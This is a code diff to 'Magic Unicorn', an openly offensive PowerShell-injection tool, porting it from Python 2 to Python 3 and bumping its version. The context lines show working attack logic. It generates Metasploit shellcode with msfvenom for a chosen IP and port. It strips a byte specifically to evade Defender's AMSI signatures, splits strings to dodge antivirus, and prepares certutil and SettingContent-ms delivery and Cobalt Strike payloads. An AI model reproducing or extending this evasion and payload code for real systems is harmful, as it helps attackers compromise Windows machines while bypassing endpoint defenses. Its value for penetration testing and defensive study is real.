@@ -26,6 +26,7 @@ import shutil
 import random
 import string
 import binascii
+from functools import reduce
 
 #######################################################################################################
 # Keep Matt Happy #####################################################################################
@@ -428,7 +429,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.2.1 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.2.2 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -471,7 +472,7 @@ def split_str(s, length):
 
 # write a file to designated path
 def write_file(path, text):
-    file_write = file(path, "w")
+    file_write = open(path, "w")
     file_write.write(text)
     file_write.close()
 
@@ -572,7 +573,7 @@ def gen_cert_attack(filename):
 
         print(
             "[*] Importing in binary file to base64 encode it for certutil prep.")
-        data = file(filename, "rb").read()
+        data = open(filename, "rb").read()
         data = base64.b64encode(data)
         print("[*] Writing out the file to decode_attack/encoded_attack.crt")
         write_file("decode_attack/encoded_attack.crt",
@@ -680,7 +681,7 @@ def generate_shellcode(payload, ipaddr, port):
         proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c".format( payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         data = proc.communicate()[0]
         # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
-        data = data.replace('"\\xfc', '"', 1)
+        data = data.decode("ascii").replace('"\\xfc', '"', 1)
 
     # start to format this a bit to get it ready
     repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}
@@ -782,10 +783,10 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     haha_av = ""
     counter = 0
     for non_signature in avnotftw:
-        non_signature = non_signature.rstrip()
-        if counter > 0: haha_av = haha_av + "+"
-        if counter > 0: haha_av = haha_av + "'" 
-        surprise_surprise = non_signature + "'"
+        non_signature = (non_signature.rstrip())
+        if counter > 0: haha_av = haha_av + ("+")
+        if counter > 0: haha_av = haha_av + ("'") 
+        surprise_surprise = non_signature.decode("ascii") + ("'")
         haha_av = haha_av + surprise_surprise #ThisShouldKeepMattHappy
         haha_av = haha_av.replace("==", "'+'==")
         counter = 1
@@ -940,11 +941,9 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 # This is the SettingContent-ms filetype based on research here: https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
 def ms_voodoo_stuff():
     # read file content in
-    ms_input = file("templates/Standalone_NoASR.SettingContent-ms", "r").read()
+    ms_input = open("templates/Standalone_NoASR.SettingContent-ms", "r").read()
     # write the content out
-    filewrite = file("Standalone_NoASR.SettingContent-ms", "w")
-    filewrite.write(ms_input)
-    filewrite.close()
+    write_file("Standalone_NoASR.SettingContent-ms", ms_input)
     settings_ms()
 
 # pull the variables needed for usage
@@ -1033,7 +1032,6 @@ try:
                     sys.exit()
 
             payload = payload.split("{")[1].replace(" };", "").replace(" ", "") # stripping out so we have 0x00 format
-            #payload = payload.split(' char buf[] = "')[1].replace("\\x", ",0x").replace(",", "", 1).replace('";', "")
 
         ipaddr = "cobaltstrike"
         port = "cobaltstrike"
